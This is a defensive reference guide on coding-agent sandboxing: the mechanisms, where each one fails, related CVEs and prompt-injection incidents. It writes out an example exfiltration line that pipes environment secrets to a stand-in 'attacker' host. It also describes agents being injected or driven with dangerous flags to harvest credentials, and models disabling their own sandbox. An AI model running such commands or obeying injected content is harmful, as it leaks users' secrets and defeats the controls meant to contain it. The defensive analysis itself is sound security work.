---
paths:
  - "__agent_only_never_match_at_startup__/**"
last-verified: 2026-09-10
---

# Agent sandboxing and isolation

A reference for reviewing and advising on what a coding agent's subprocesses can reach: filesystem, network, sockets, other processes, and the machine's credentials. Used by the `agent-sandboxing` subagent. The scope is the boundary itself: which mechanism draws it (Seatbelt, bubblewrap, Landlock, seccomp, cgroups, a container, a microVM), which processes sit inside it, what is readable inside it, what can leave it, and what happens when the mechanism is missing. It is not the application code that calls the model (`llm-app`), not how many agents to run or how to tell that one has stalled (`agent-orchestration`), and not the model server's memory budget (`local-inference`).

The unifying model: **a sandbox is a claim, and the failures live in the gap between the claim and the enforcement.** Every incident in this file's record is one of a small number of gaps: the boundary enclosed the wrong process, the boundary restricted writes and left reads open, the boundary switched itself off when its mechanism was unavailable, the boundary was a text match on a command string, or the boundary let one write through that installed code for the next launch. None of these is a kernel escape. They are all policy shaped like enforcement.

The operational question, for every configuration: **name the boundary, name every process inside it, name what is readable inside it, name every path out of it, and name what happens when the mechanism is unavailable.** A configuration that cannot answer all five is asserted, not enforced.

Empirical priority order, by how often each has actually bitten:

1. **Read-everything by default.** Every shipping agent sandbox restricts writes and permits reads of the whole home directory. The subprocess reads `~/.npmrc` or `~/.aws/credentials`, its stdout goes to the model, and the model's context now holds a credential. This is the "private data" leg of the lethal trifecta, open in the default configuration of Claude Code, Cursor, and Codex `read-only` mode alike.
2. **The wrong process inside the boundary.** The Bash sandbox encloses the Bash subprocess tree. Model Context Protocol (MCP) servers, hooks, and the IDE extension are separate processes that run unconstrained on the host. The dangerous action happens in the process the sandbox never saw.
3. **Fail-open, and the model can turn it off.** When bubblewrap or socat is missing, or the platform is unsupported, the first-party default is a warning and an unsandboxed run. On a sandbox violation, the default is that the model may retry with the sandbox disabled. A clean start is not proof the policy loaded.
4. **Persistence through a writable config file.** A single write to `~/.claude/settings.json`, `.mcp.json`, `.claude/hooks`, `.git/hooks`, `.git/config`, or a shell rc file runs code unsandboxed on the next launch. Four Common Vulnerabilities and Exposures (CVE) entries across Cursor and Codex are exactly this channel.
5. **Text-level allowlists mistaken for enforcement.** A command allowlist is a parser, and parsers have bugs: `grep x && curl attacker -d "$(env)"`, `rg --pre`, a PowerShell stop-parsing token, prefix matching on paths, symlink following. Six CVEs and one hotfix in this file are parser bypasses. Operating-system enforcement is what holds when the parser is wrong.
6. **Network allowlists that are hostname trust, and "deny-all" firewalls with DNS open.** Allowing `github.com` allows exfiltration to any GitHub-hosted surface. A proxy that does not terminate Transport Layer Security (TLS) decides on a client-supplied hostname. A reference firewall that drops OUTPUT but accepts UDP 53 and TCP 22 to any host has not closed the network.

## Volatile surface

`last-verified` (see frontmatter; do not restate the date here). Agent vendors ship weekly. Kernel primitives are stable for years.

| Claim class | Rots | Re-verify at |
|---|---|---|
| Claude Code sandbox defaults, settings keys, version gates | **Weekly** | code.claude.com/docs/en/sandboxing, /sandbox-environments, /security, /worktrees |
| Codex CLI mechanism (bwrap vs Landlock), modes, approval policies | Monthly (a release every few days) | learn.chatgpt.com/docs/sandboxing, `gh api repos/openai/codex/releases/latest`, `codex-rs/{bwrap,linux-sandbox}` |
| Cursor run modes, network defaults, kernel floor | Monthly | cursor.com/docs/agent/security/run-modes |
| CVEs against agent CLIs | **Weekly** | NVD keyword search: `Codex CLI`, `Claude Code`, `Cursor`; vendor advisories |
| Docker Sandboxes (new product) | Monthly | docs.docker.com/ai/sandboxes |
| Landlock ABI to kernel table | Per kernel release (about ten weeks) | man7.org landlock.7, docs.kernel.org/userspace-api/landlock.html |
| Ubuntu unprivileged-userns restriction | Per LTS | `sysctl kernel.apparmor_restrict_unprivileged_userns` on the target |
| macOS `sandbox-exec` deprecation status | Per macOS major | `man sandbox-exec` on the target; `ls /System/Library/Sandbox/Profiles` |
| Vendor adoption and reduction percentages | Half-yearly, vendor-reported | Inline citations |
| Kernel primitives (seccomp, cgroup v2, namespaces), Firecracker design, gVisor architecture | Stable | docs.kernel.org, project repos |

## What a subprocess inherits

Before any mechanism, the baseline: a subprocess of an agent inherits what the agent's parent process had.

- **Environment variables**, including any credentials set there. Claude Code's sandboxed Bash inherits the parent environment by default (verified). Mitigations exist (`sandbox.credentials.envVars` deny or mask, `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB`) and are opt-in.
- **Filesystem reads of the whole computer**, minus a short protected-path list. Claude Code's doc says so in as many words, and adds: "this default still allows reading credential files such as `~/.aws/credentials` and `~/.ssh/`" and "There is no built-in credential deny list" (verified). Cursor replaced a command allowlist with a write-restricting Seatbelt profile that permits reads, and Luca Becker (2025-11-04) watched the agent `cat ~/.npmrc`: "everything that goes to STDOUT from spawned processes gets sent to the LLM. My credentials were leaked" (verified). Codex `read-only` mode "can inspect files, but it can't edit files or run commands without approval" (verified), which is the same read-everything property.
- **Unix sockets.** Any sandbox that can reach `/var/run/docker.sock` is root on the host: Docker's own reference says bind-mounting it grants "full access to create and manipulate the host's Docker daemon" (verified), and Claude Code's doc says it "effectively grants access to the host system" (verified). OpenHands' documented local launch bind-mounts exactly that socket into the app container (verified). On WSL2, Windows binaries launch over a Unix socket to the host, and only the optional seccomp filter blocks it (verified).
- **The terminal's Transparency, Consent, and Control (TCC) grants.** On macOS, TCC grants attach to the responsible process, so every subprocess of a terminal-launched agent inherits whatever Full Disk Access or Documents grants the human gave Terminal or iTerm2. **INFERRED**; Apple's guide page redirected under a headless browser and the specifics were not read. The one verified fragment: Claude Code's doc says AppleScript automation is "subject to the per-app macOS automation-consent prompt (TCC)".
- **The tmux server socket.** **INFERRED**: a subprocess that can reach `/tmp/tmux-<uid>/default` can `tmux send-keys` into any pane, including a human's shell. No vendor document addresses this.
- **SSH agent, gpg-agent, and Keychain reachability**: **UNVERIFIED**. No vendor document addresses any of the three, and they were not tested. On macOS the Keychain is per-process access-controlled rather than path-based, so a path sandbox does not cover it by construction (**INFERRED**).

## Mechanisms and where each one actually stops

### Linux

**Namespaces and cgroups.** Namespaces arrived between kernel 2.6.15 and 2.6.26; cgroups do resource accounting and limiting; capabilities are an allowlist, not a denylist (verified, Docker security page). cgroup v2 controls, verified from the kernel admin guide: `pids.max` is a hard limit on process count and fork fails with `EAGAIN`; `memory.max` invokes the OOM killer inside the cgroup when usage cannot be reduced; `memory.high` throttles and "never invokes the OOM killer"; `cpu.max` is `$MAX $PERIOD` with default `max 100000`; `io.max` takes rbps, wbps, riops, wiops and "Temporary bursts are allowed". The no-internal-process constraint: a non-root cgroup can hand resources to children only when it has no processes of its own.

**seccomp-bpf.** Filters see "system call number and the system call arguments" and "BPF programs may not dereference pointers", which is what makes them immune to time-of-check-time-of-use races (verified, kernel doc). Requires `PR_SET_NO_NEW_PRIVS` or `CAP_SYS_ADMIN`. Actions in precedence: `KILL_PROCESS`, `KILL_THREAD`, `TRAP`, `ERRNO`, `USER_NOTIF`, `TRACE`, `LOG`, `ALLOW`. **INFERRED consequence**: seccomp cannot filter by path string. "Deny `open()` of `~/.ssh`" is not expressible in seccomp. That is Landlock's or a mount namespace's job.

**Landlock.** Application binary interface (ABI) versions map to kernels (verified, man7 and kernel doc): 1 = 5.13, 2 = 5.19 (`FS_REFER`), 3 = 6.2 (`FS_TRUNCATE`), 4 = 6.7 (TCP bind and connect), 5 = 6.10 (device ioctl), 6 = 6.12 (scoping of abstract Unix sockets and signals), 7 = 6.15 (logging), 8 = 7.0 (TSYNC), 9 = 7.1 (pathname Unix sockets). The kernel doc lists ABI 10 (UDP) and 11 (`RESTRICT_SELF_NO_NEW_PRIVS`) without man-page kernel numbers yet (**UNVERIFIED** mapping). man7's instruction: "use the Landlock ABI version rather than the kernel version." What Landlock cannot restrict (verified list): `chdir`, `stat`, `flock`, `chmod`, `chown`, `setxattr`, `utime`, `fcntl`, `access`; mount and `pivot_root` topology; files reached through `/proc/<pid>/fd/*`; ioctl on pre-existing descriptors. Requires `CONFIG_SECURITY_LANDLOCK=y` and `landlock` in the `lsm=` list; `dmesg` says "landlock: Up and running" when it is. **INFERRED**: below 6.7 a Landlock sandbox has no network rules at all; below 6.12 a sandboxed process can still signal, or connect to the abstract sockets of, unsandboxed processes; on a distro that omits landlock from `CONFIG_LSM`, `landlock_create_ruleset` fails and a caller that ignores the error runs unsandboxed. Cursor's Linux sandbox requires kernel 6.2 or later (verified).

**User namespaces and the Ubuntu restriction.** Ubuntu 23.10 opt-in, 24.04 and later by default: `kernel.apparmor_restrict_unprivileged_userns=1`, because "Unprivileged user namespaces are now broadly used as a step in several privilege escalation exploit chains" (verified). Effect: bubblewrap cannot create its user namespace. Fixes: an AppArmor profile for `bwrap` with `userns` (Claude Code doc), or Codex's `bwrap-userns-restrict` profile on 24.04; "Ubuntu 25.04 should work without extra AppArmor configuration" (verified).

**bubblewrap.** Its README, verbatim: "bubblewrap is not a complete, ready-made sandbox with a specific security policy" and "the level of protection between the sandboxed processes and the host system is entirely determined by the arguments passed to bubblewrap" (verified). It starts from an empty mount namespace on a tmpfs root; `--unshare-net` yields a network namespace with only loopback; seccomp arrives by file descriptor. nsjail adds Kafel seccomp policies, rlimits, and every namespace type (verified). firejail is an SUID sandbox with 900-plus profiles (verified); **INFERRED**: an SUID sandbox binary is itself local-privilege-escalation surface (firejail's CVE history: **UNVERIFIED** specifics).

**gVisor.** The Sentry reimplements the syscall API in user space and is itself restricted by seccomp to "socket communication with a Gofer process, a minimal set of host system calls ..., and packet read/write operations to virtual ethernet devices" (verified). It is not a VM, it is "not a substitute for a secure architecture", and it offers no protection from hardware side channels. Platforms: systrap (default since mid-2023), KVM (best on bare metal), ptrace (deprecated, "no longer supported"). Under nested virtualization, systrap beats KVM.

**Firecracker.** "All vCPU threads are considered to be running malicious code as soon as they have been started" (verified, design doc). Layers: KVM, a seccomp filter on the virtual machine monitor (VMM) itself, the jailer (cgroup, chroot, dropped privileges), namespaces. Boot to `/sbin/init` in 125 ms or less, VMM thread overhead 5 MiB or less, five microVMs per host core per second at 128 MiB and one vCPU (verified spec and design doc). And the sentence to quote back at anyone who thinks a VM is a firewall: "Firecracker does not perform any network traffic filtering. All egress traffic from a guest is therefore considered untrusted, and should be filtered at the host-level." Kata Containers wraps QEMU (best for GPU and confidential computing), Cloud Hypervisor, Firecracker, Dragonball, and StratoVirt (verified).

**Docker: rootless, flags, and Sandboxes.** Rootless mode exists "to mitigate potential vulnerabilities in the daemon and the container runtime"; its limits (verified): storage drivers overlay2 (kernel 5.11 and later), fuse-overlayfs, btrfs, vfs; "cgroup is supported only when running with cgroup v2 and systemd"; no AppArmor, no checkpoint, no overlay network. **INFERRED**: rootless changes who the daemon runs as, not the kernel boundary, and on a cgroup v1 host every resource limit is silently a no-op. Hardening flags (verified): `--read-only`, `--tmpfs` (writable, and executable unless `noexec` is passed), `--security-opt no-new-privileges`, `--pids-limit`, `--cap-drop`. Docker Sandboxes, the new free product (verified): a microVM per agent with its own daemon, filesystem, and network; "The agent has full control inside the VM, including sudo access"; "API keys are injected into HTTP headers by the host-side proxy. Credential values never enter the VM"; deny-by-default network with TCP proxied through the host and "Direct external UDP and ICMP are blocked at the network layer"; and the caveat "A direct mount is read-write, so the agent edits your working tree in place."

### macOS

**Seatbelt (`sandbox-exec`).** Measured on this machine (macOS 26.5, 2026-09-10): `man sandbox-exec` reads "execute within a sandbox (DEPRECATED)" and points developers at App Sandbox; the man page is dated 2017-03-09; the binary works; `/System/Library/Sandbox/Profiles/*.sb` still ship. It is what Claude Code, Codex, Cursor (2.0 and later), and Gemini CLI use (verified). Pierce Freeman: "The sandbox subsystem is what all of Apple's system software uses for sandboxing, as well as many security-conscious third-party programs such as web browsers" (verified). Verdict: deprecated as a public interface, load-bearing as a kernel mechanism, no removal announced. **INFERRED risk**: the profile language (SBPL) is undocumented and Apple can change its semantics in a point release. Anthropic's sandbox-runtime README documents two holes in its own profiles (verified): `enableWeakerNetworkIsolation` "opens a potential data exfiltration vector through the trustd service" (a system daemon inside the profile does network I/O on the sandboxed process's behalf), and `allowAppleEvents` "removes code-execution isolation: sandboxed commands can launch other applications unsandboxed with no user prompt."

**App Sandbox.** Entitlement-based at code-sign time, built for bundled applications rather than ad hoc CLI subprocess trees (**FOUND-UNVERIFIED**; Apple's page is JavaScript-rendered and was not read). Freeman's summary, verified: "Apple's preferred approach with static entitlements".

**Endpoint Security.** The API exposes `ES_EVENT_TYPE_AUTH_*` events that a client must allow or deny and `ES_EVENT_TYPE_NOTIFY_*` events that only inform, including `ES_EVENT_TYPE_AUTH_XPC_CONNECT` and `ES_EVENT_TYPE_NOTIFY_TCC_MODIFY` (verified from the symbol list via a headless browser). So a system extension can deny operations system-wide. **FOUND-UNVERIFIED**: it requires a restricted entitlement granted by Apple, which makes it an endpoint-protection vendor's tool and not something an agent CLI can adopt. `launchd` launch constraints: not researched.

### Windows

Codex ships a native sandbox in PowerShell (verified). Anthropic's sandbox-runtime Windows alpha uses a dedicated `srt-sandbox` local user, Windows Filtering Platform egress filters, and NTFS ACLs (verified). Cursor runs its Linux sandbox inside WSL2 (verified). Claude Code's Bash sandbox: "Native Windows is not supported" (verified). CVE-2026-19591: a PowerShell stop-parsing token bypassed Codex's approval and filesystem sandbox in 0.72.0 through 0.130.0, fixed in 0.131.0, published 2026-09-01 (verified).

## Asserted versus enforced: the catalog

Each entry: the trigger, the symptom, the fix, and the incident that made it real. All verified unless marked.

1. **Fail-open.** Trigger: bwrap or socat missing, the Ubuntu userns restriction, WSL1, an unsupported platform. Symptom: Claude Code "shows a warning and runs commands without sandboxing." Fix: `sandbox.failIfUnavailable: true`. Same shape in sandbox-runtime: with no valid settings file "the runtime starts anyway ... Don't take a clean start as proof your settings loaded." Landlock analog (**INFERRED**): ruleset creation fails on an old kernel, silently if unchecked.
2. **The model turns it off.** Trigger: any sandbox violation. Symptom: "Claude analyzes the violation and may retry the command with the `dangerouslyDisableSandbox` parameter", on by default. Fix: `allowUnsandboxedCommands: false`. Cursor tells the agent about the constraint and lets it request escalation with a visible prompt; Codex has `danger-full-access`.
3. **The wrong process.** Trigger: an MCP server or hook does the dangerous thing. Symptom: "MCP servers and hooks are separate processes that run unconstrained on the host." Fix: wrap the whole agent (`npx @anthropic-ai/sandbox-runtime claude`), a container, or a VM.
4. **Writable config equals persistence.** Trigger: `filesystem.disabled: true` or a broad `allowWrite`. Symptom: a write to `~/.claude/settings.json`, `.mcp.json`, hooks, rc files, or a `$PATH` directory, and the next launch runs attacker code unsandboxed. Realized as CVE-2025-54135 (Cursor CurXecute, NVD 9.8) and CVE-2025-54136 (MCPoison), both through `.cursor/mcp.json`; CVE-2025-61260 (Codex CLI 0.23.0 and earlier, malicious MCP config executes without confirmation, published 2026-04-14); CVE-2026-19592 (Codex, attacker-controlled git `fsmonitor` helper runs while collecting repo metadata, fixed 0.131.0). Vendors now deny these paths by default; Claude Code's protected paths cannot be exempted except by disabling the filesystem layer entirely.
5. **Deny list built once at launch.** Trigger: `git init`, `git clone`, or a scaffolder creates a new repository mid-session. Symptom: sandbox-runtime on Linux "does not cover anything the session creates later"; macOS checks at write time and does. Fix: know which platform you are on, and re-launch after creating repositories on Linux.
6. **Path prefix and symlink.** CVE-2025-54794 (Claude Code before 0.2.111): "Path validation flaw using prefix matching instead of canonical path comparison", CVSS 9.1. CVE-2025-55345 (Codex before 0.12.0): "Symlink following in workspace-write mode enables arbitrary file overwrite and remote code execution." CVE-2025-59532 (Codex 0.2.0 through 0.38.0): "Model-generated paths bypass sandbox boundaries." Claude Code worktree creation now refuses symlinked `.claude/worktrees` paths; before 2.1.212 it followed them "and could create files outside the repository." Landlock note: it cannot restrict `mount` or `pivot_root`, so a bind mount inside the sandbox bypasses path rules if mounting is allowed (**INFERRED** from the verified limitation list).
7. **Command parsing bypasses the approval gate.** CVE-2025-54795 (Claude Code before 1.0.20): "An error in command parsing makes it possible to bypass the Claude Code confirmation prompt", CVSS 9.8. Gemini CLI (Tracebit, fixed 0.1.14 on 2025-07-25): allowlisted `grep` followed by `&& curl attacker -d "$(env)"` with whitespace hiding the tail. CVE-2025-54558 (Codex before 0.9.0): ripgrep auto-approved even with `--pre`, an arbitrary preprocessor command. CVE-2026-19591: the PowerShell `--%` token. Claude Code's own security page concedes the class: a deny rule "matches the command as written; for network enforcement that doesn't depend on the command text, see sandbox network isolation."
8. **Hostname trust called an allowlist.** Trigger: `github.com` allowed. Symptom: exfiltration to any GitHub-hosted surface (a gist, an issue, a repository the attacker controls); the proxy "does not terminate or inspect TLS" and decides on the client-supplied hostname, so "domain fronting or similar techniques" reach hosts outside the list. Nx s1ngularity posted stolen credentials "as an encoded string to a github repo under the user's Github account" (verified, GitHub advisory). Claude Code's doc: "Stronger TLS-aware network isolation is an active area of development."
9. **"Deny-all" with DNS open.** Trigger: the reference devcontainer `init-firewall.sh`: `iptables -P OUTPUT DROP`, then `-p udp --dport 53 -j ACCEPT` to any resolver and `-p tcp --dport 22 -j ACCEPT` to any host, with allowlisted domains resolved to IPs once at setup by `dig` (verified script). **INFERRED consequences**: DNS tunneling to an attacker-controlled authoritative server and SSH to any host are not blocked, and IP churn at a CDN breaks the allowlist. Contrast: bwrap `--unshare-net` and sandbox-runtime remove the network namespace; Docker Sandboxes block direct external UDP and ICMP.
10. **Read-only that is not.** Trigger: `docker run --read-only` with `--tmpfs /tmp`. Symptom: a writable, executable tmpfs to stage a payload in (**INFERRED** from verified flag semantics; pass `noexec`). And every `read-only` mode still reads every credential on disk into the model.
11. **Rootless called safe.** Trigger: a cgroup v1 or non-systemd host. Symptom: resource limits silently unsupported. The daemon's user changed; the kernel boundary did not.
12. **A classifier called a boundary.** Claude Code: "The classifier is a per-action control, not an isolation boundary." Cursor's Auto-review pairs a classifier with a sandbox for the same reason.

## What the current agents do

As of `last-verified`; this section rots monthly.

**Claude Code 2.1.267.** Bash-only sandbox: Seatbelt on macOS; bubblewrap plus a socat relay to an out-of-sandbox HTTP/SOCKS5 proxy plus an optional seccomp filter (which blocks Unix sockets) on Linux and WSL2. Two independent layers, filesystem and network, each switchable. Default write scope: the working directory, the session `$TMPDIR`, `--add-dir` directories. Default read scope: the whole computer minus protected paths. Network: no domains pre-allowed; a prompt per new host, or the classifier in auto mode; `strictAllowlist` (2.1.219 and later); `allowManagedDomainsOnly`. The proxy does not terminate TLS by default; `tlsTerminate` is experimental (2.1.199 and later). Credential `deny` and `mask`; mask needs `tlsTerminate` and re-signs SigV4 for AWS. Fail-open and the model escape hatch are both on by default. Anthropic reports 84% fewer permission prompts with the sandbox on (2025-10-20). The doc's own limits: the Bash sandbox alone "is not sufficient for fully unattended runs"; containers are "a convention rather than an enforcement boundary" and only the built-in sandbox is enforceable through managed settings. Refuses `--dangerously-skip-permissions` as root. Whole-process option: `@anthropic-ai/sandbox-runtime` (Apache-2.0, repository created 2025-10-20, beta). Claude Code on the web: an Anthropic-managed VM per session, the GitHub token held in a proxy outside the sandbox, pushes restricted to the working branch.

**Codex CLI rust-v0.154.0 (2026-09-09).** Seatbelt on macOS. Linux and WSL2: bubblewrap primary ("the first `bwrap` executable it finds on `PATH`"), with the bundled Landlock-plus-seccomp helper (`codex-rs/linux-sandbox`, verified crate manifests) as fallback. Modes: `read-only`, `workspace-write` (default; network constrained; extend with `writable_roots`), `danger-full-access`. Approval policies `on-request` and `never`; `untrusted` retired. "Sandboxing and approvals are different controls that work together." The sandbox applies to spawned commands, not only built-in file operations. CVE trail: 2025-54558, 2025-55345, 2025-59532, 2025-61260, 2026-19591, 2026-19592, plus 2026-14898 (the macOS app rendered remote Markdown images and exfiltrated data under indirect prompt injection; fixed 26.527.31326 on 2026-07-06).

**Cursor** (blog 2026-02-18 by Betts, Gaitonde, and Haugland; run-modes doc). Seatbelt via `sandbox-exec` with a profile generated from workspace settings and `.cursorignore`. Linux: "Landlock and seccomp directly", kernel 6.2 and later; "Finding and remounting these files is the slowest part of Linux sandboxing." Windows through WSL2. Run modes: Auto-review (classifier plus sandbox), Allowlist, Run Everything. Network "blocked by default, then opened by your network mode"; the default mode is an allowlist plus built-in package-manager domains (github.com, npmjs.com, pypi.org). Reported: a third of requests on supported platforms run sandboxed, and "Sandboxed agents stop 40% less often than unsandboxed ones." Team settings override individual ones. Reads `$HOME` by default (Becker).

**Aider.** No sandbox. Model-suggested shell commands pass through `confirm_ask("Run shell command?")` (verified in `base_coder.py`). The Docker page is about ephemerality, not security, and makes no isolation claim.

**OpenHands.** Actions run in a Docker runtime container through an action-execution server; the documented local launch bind-mounts `/var/run/docker.sock` into the app container, which is host-root-equivalent. The direct-install README: "the agent will have full access to your filesystem!"

**Gemini CLI.** Docker, Podman, or Seatbelt; a persistent red warning when unsandboxed (verified via Google's statement quoted by Tracebit).

## Threat model: prompt injection drives exfiltration

- **The lethal trifecta** (Simon Willison, 2025-06-16, verified): private data, untrusted content, and external communication. "LLMs follow instructions in content." A vendor's claim to detect 95% of attacks is "very much a failing grade." A sandbox is the mechanism that removes a leg; a read-everything sandbox with any egress has removed none.
- **GitHub MCP exfiltration** (Invariant Labs, 2025-05-26, verified): a malicious public issue led Claude 4 Opus with the GitHub MCP server to pull private repository data into context and leak it "in an autonomously-created PR in the public repository." "model alignment is not enough."
- **Gemini CLI** (Tracebit, 2025-07, verified): an injection hidden in a README's license text; `grep x && curl attacker -d "$(env)"`.
- **Amazon Q Developer 1.84.0** (AWS bulletin 2025-07-23, verified): "an improperly scoped GitHub token" let an attacker commit into the extension's repository and ship in a release; the code was "unsuccessful in executing due to a syntax error." That it was a wiper prompt is **FOUND-UNVERIFIED** (press reporting, not fetched).
- **Nx s1ngularity** (2025-08-26, verified advisory and Wiz analysis): a malicious postinstall "weaponized installed AI CLI tools by prompting them with dangerous flags (`--dangerously-skip-permissions`, `--yolo`, `--trust-all-tools`)" to enumerate wallets, keystores, `.env` files, SSH keys, and GitHub and npm tokens; more than 1,000 GitHub tokens leaked, and phase two published more than 5,500 private repositories from 400-plus accounts. This is the canonical case for the sentence: **an installed agent CLI is an exfiltration tool for any process that can exec it.** The GitHub advisory itself never mentions the AI CLIs (verified absence).
- **Claude Code CVEs**: 2025-52882 (the IDE extension's WebSocket accepted connections from attacker web pages, fixed 2025-06), 2025-54794, 2025-54795. **Coder AgentAPI** CVE-2025-59956: DNS rebinding against a localhost HTTP server exfiltrated message history.

## Schools of thought

Each position in its own strongest form. Do not average them.

### VM per agent, container, or process-level confinement

**VM.** Firecracker treats every vCPU as malicious from the first instruction. Claude Code's doc calls a VM "the strongest separation, with its own kernel" and names it for "untrusted code" and when "security policy requires kernel-level separation." Docker built Docker Sandboxes as microVMs specifically for agents; Claude Code on the web and Devin are VM-per-session. The cost argument is dead: 125 ms boot and 5 MiB overhead. And only a VM boundary makes `docker.sock`, nested Docker, and kernel local-privilege-escalation a non-issue.

**Container.** It is what organizations already have: Claude Code's doc calls custom containers "the most common path for organizations with existing container infrastructure." Its critics' strongest points are Docker's own: bind mounts and the daemon socket are root-equivalent, and gVisor exists because the shared kernel is the weak point.

**Process-level (Seatbelt, bubblewrap, Landlock).** Freeman: "OS-native enforcement lets them avoid a lot of overhead while still getting pretty good isolation." Zero setup on macOS, no Docker dependency, the developer's real toolchain and local services just work, and the adoption numbers are the argument: a third of Cursor requests, 40% fewer stops, 84% fewer prompts. The conceded weaknesses: it covers only the subprocess tree, "This sort of mistake is easy to make with Seatbelt but harder to make with containers" (Freeman), and read-by-default leaks secrets (Becker).

Unreconciled. Anthropic's own docs give a different answer per threat: process sandbox for daily prompts, container or VM for unattended runs, VM for untrusted repositories.

### Deny-by-default network, or allowlisted egress

**Deny.** sandbox-runtime denies all network by default; bwrap removes the namespace; Docker Sandboxes deny by default. The argument is the trifecta: any egress plus any readable secret completes it, and allowlists are porous by construction (domain fronting, `github.com`).

**Allowlist.** Agents need the model API, package registries, and git remotes, or they do nothing. Cursor ships package-manager defaults; Claude Code prompts per host and saves the rule. The middle path both sides accept: credential masking at the proxy (Claude Code `mask`, Docker Sandboxes header injection) makes the token itself impossible to exfiltrate even with egress. It does not protect repository contents.

Unreconciled, and the vendor says so: "Stronger TLS-aware network isolation is an active area of development."

### Can macOS sandbox developer tooling at all

**No.** `sandbox-exec` is deprecated by its own man page. SBPL is undocumented. App Sandbox is for signed bundles with static entitlements. TCC is consent per app and inherited from the terminal. The `trustd` exfiltration vector and the AppleEvents hole show how porous a profile can be. There is no third-party Landlock or seccomp equivalent, and Endpoint Security needs an Apple-granted entitlement.

**Yes.** Seatbelt is the mechanism every Apple daemon and every browser runs on, present and functional on macOS 26.5. Anthropic, OpenAI, Cursor, and Google all chose it and ship it by default. Anthropic's runtime generates profiles dynamically with a localhost-only hole to a proxy. For what Seatbelt cannot cover, Virtualization.framework gives a microVM (Docker Sandboxes uses it).

Unreconciled. The vendor consensus, "Seatbelt for daily driving, a VM for unattended", is a policy, not a resolution.

## Anti-pattern catalog

Each: the pattern, the trigger, the consequence, the fix.

- **Trusting the default read scope.** Trigger: any agent with a home directory full of credentials. Consequence: a credential in the model's context on the first `cat`. Fix: an explicit read deny list (`~/.ssh`, `~/.aws`, `~/.npmrc`, `~/.netrc`, `~/.config/gh`, `.env` outside the project), env scrubbing, or a VM with credentials injected at the proxy.
- **Sandboxing Bash and calling the agent sandboxed.** Trigger: MCP servers or hooks configured. Consequence: the dangerous action runs on the host. Fix: whole-process runtime, container, or VM; and inventory every process the agent spawns.
- **Fail-open left on.** Trigger: a machine without bwrap, an Ubuntu 24.04 host, WSL1. Consequence: a warning nobody reads and no sandbox. Fix: `failIfUnavailable: true`, and a startup assertion that the policy loaded.
- **Escape hatch left on for unattended runs.** Trigger: any violation. Consequence: the model disables its own sandbox. Fix: `allowUnsandboxedCommands: false` for anything unattended.
- **Writable config inside the boundary.** Trigger: `filesystem.disabled` or broad `allowWrite` that reaches settings, hooks, rc files, `.git/config`. Consequence: persistence on next launch. Fix: keep the protected paths protected; on Linux with sandbox-runtime, re-launch after `git init`.
- **Allowlisting a command string.** Trigger: `Bash(grep:*)`-style rules relied on as the safety boundary. Consequence: a parser bypass; there have been seven. Fix: treat text rules as convenience and the OS sandbox as enforcement.
- **Allowing `github.com`.** Trigger: agents need to push. Consequence: an exfiltration channel under the victim's own account. Fix: credential masking, a push-restricted proxy, or a deny-by-default network with the git remote reached through a host-side proxy.
- **DROP with port 53 and 22 open.** Trigger: the reference firewall copied verbatim. Consequence: DNS tunneling and SSH to anywhere. Fix: `--unshare-net` or a microVM; if iptables, restrict 53 to the resolver and drop 22.
- **Bind-mounting `docker.sock`.** Trigger: an agent that needs to build images. Consequence: host root. Fix: a VM with its own daemon (Docker Sandboxes), or rootless Docker with the understanding that it is not a kernel boundary.
- **Resource limits on a cgroup v1 host.** Trigger: rootless Docker on an older distro. Consequence: `memory.max` and `pids.max` silently do nothing. Fix: check `stat -fc %T /sys/fs/cgroup` says `cgroup2fs` before trusting a limit.
- **`--read-only` with an executable tmpfs.** Trigger: hardening flags copied from a tutorial. Consequence: a staging area for payloads. Fix: `--tmpfs /tmp:rw,noexec,nosuid`.
- **Symlinks and prefixes in path policy.** Trigger: home-grown path validation. Consequence: CVE-2025-54794 and CVE-2025-55345 all over again. Fix: canonicalize with `realpath` before comparing, and refuse symlinked policy roots.
- **Reading a classifier's verdict as isolation.** Trigger: auto mode. Consequence: an action-level filter treated as a boundary. Fix: the vendor's own sentence: "a per-action control, not an isolation boundary."

## Authorities

- **The vendors' own sandboxing docs**, read adversarially: code.claude.com (sandboxing, sandbox-environments, security, worktrees), learn.chatgpt.com/docs/sandboxing, cursor.com run-modes and the 2026-02-18 sandboxing post, docs.docker.com/ai/sandboxes. Each names its own limits in plain language when read to the end.
- **Simon Willison, "The lethal trifecta"** (2025-06-16), the threat model in one sentence.
- **Luca Becker, "Cursor sandboxing leaks secrets"** (2025-11-04), the read-everything failure observed first-hand.
- **Pierce Freeman, "A deep dive on agent sandboxes"** (2025-09-26), the process-level case and its conceded weaknesses.
- **Invariant Labs** (GitHub MCP, 2025-05-26), **Tracebit** (Gemini CLI, 2025-07), **Wiz and the GitHub advisory** (Nx s1ngularity, 2025-08-26), **AWS bulletin AWS-2025-015** (Amazon Q): the incident record.
- **NVD** for the CVE trail against Claude Code, Codex, Cursor, and Coder AgentAPI.
- **Kernel documentation**: `userspace-api/seccomp_filter`, `userspace-api/landlock`, `admin-guide/cgroup-v2`; **man7 landlock.7** for the ABI table.
- **bubblewrap README**, for the sentence that it is not a sandbox but a tool for building one; **nsjail** and **firejail** READMEs.
- **gVisor architecture and security docs**; **Firecracker `design.md` and `SPECIFICATION.md`**, and Agache, Brooker, et al., NSDI 2020; **Kata Containers** hypervisor docs.
- **Docker** security, rootless, and `docker run` reference pages.
- **Ubuntu's 23.10 blog post** on restricting unprivileged user namespaces.
- **`man sandbox-exec`** on the target macOS, and the **sandbox-runtime README** for Seatbelt porosity.

## Severity rubric

What the levels mean in this domain specifically.

- **blocker**: a sandbox asserted where none is enforced (fail-open on a host that lacks the mechanism, an unattended run with the model escape hatch on, `docker.sock` inside the boundary, a text allowlist as the only control); credentials readable inside a boundary that has any egress; a writable path inside the boundary that reaches a config the next launch executes.
- **major**: read-everything default left in place on a machine with credentials in `$HOME`; MCP servers or hooks outside the boundary with no compensating control; `github.com` or another multi-tenant host on the network allowlist without credential masking; a "deny-all" firewall with DNS or SSH open; resource limits on a host where they cannot apply.
- **minor**: `--tmpfs` without `noexec`; a Landlock policy without an ABI check; path comparison without canonicalization in a non-security-critical helper; a TCC-inherited grant the agent does not need.
- **nit**: a deprecation warning not acknowledged in a runbook; a version gate cited without its date.
- **insight**: structural observations. "This agent's threat model treats the repository as trusted content; the incident record says READMEs and issues are attacker-controlled." "The two ceilings here, what the agent can read and where it can send, are set by two different settings files and nobody owns their product."

## Changelog

